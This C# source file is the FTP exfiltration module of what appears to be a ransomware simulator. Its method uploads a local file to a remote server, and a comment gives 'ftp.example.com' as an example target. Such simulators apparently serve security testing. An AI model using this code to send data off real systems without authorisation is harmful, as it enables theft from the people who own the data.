using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace RansomwareSimulator.Exfil
{
   public static class FTP
    {
        public static void Exfiltrate(string remotepath, string localfile,string remotefile, string uname,string pwd)
        {
            FtpWebRequest request =
    (FtpWebRequest)WebRequest.Create(string.Concat(remotepath, "/", remotefile)); // "ftp://ftp.example.com/remote/path/file.zip");  ;
            request.Credentials = new NetworkCredential(uname, pwd);
            request.Method = WebRequestMethods.Ftp.UploadFile;

            using (Stream fileStream = File.OpenRead(localfile))
            using (Stream ftpStream = request.GetRequestStream())
            {
                byte[] buffer = new byte[10240];
                int read;
                Console.WriteLine("Starting FTP Exfiltration");
                while ((read = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ftpStream.Write(buffer, 0, read);
                    Console.WriteLine("Uploaded {0} bytes", fileStream.Position);
                }
            }
        }
    }
}
